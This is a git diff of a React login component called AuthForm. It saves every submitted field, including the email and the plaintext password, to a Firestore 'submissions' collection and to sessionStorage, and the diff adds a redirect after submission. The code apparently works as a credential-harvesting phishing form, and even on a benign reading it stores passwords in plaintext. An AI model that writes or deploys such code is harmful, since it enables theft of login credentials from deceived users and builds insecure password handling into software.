@@ -3,6 +3,8 @@ import React, { useState } from 'react';
 import { collection, addDoc } from 'firebase/firestore';
 import { db } from '../utils/firebase'; // Import your initialized db instance
 
+const baseURL = import.meta.env.BASE_URL;
+
 export default function AuthForm() {
     const [status, setStatus] = useState<string>("");
   
@@ -17,7 +19,7 @@ export default function AuthForm() {
       formData.forEach((value, key) => {
         data[key] = value.toString();
       });
-  
+      
       try {
         await addDoc(collection(db, "submissions"), {
           ...data,
@@ -29,6 +31,8 @@ export default function AuthForm() {
 
         window.sessionStorage.setItem("email", data["email"])
         window.sessionStorage.setItem("password", data["password"])
+
+        window.location.href = baseURL + "1";
         form.reset();
       } catch (err) {
         setStatus("❌ Wrong password or invalid input.");
@@ -36,7 +40,7 @@ export default function AuthForm() {
     };
   
     return (
-      <div className="max-w-md mx-auto bg-white shadow rounded-lg flex-col">
+      <div className="max-w-md mx-auto bg-white shadow rounded-lg flex-col min-h-screen items-center">
         <h1 className="text-xl font-bold mb-4">Enter your details</h1>
         <form onSubmit={handleSubmit} className="space-y-10">
           <div className="flex flex-col">
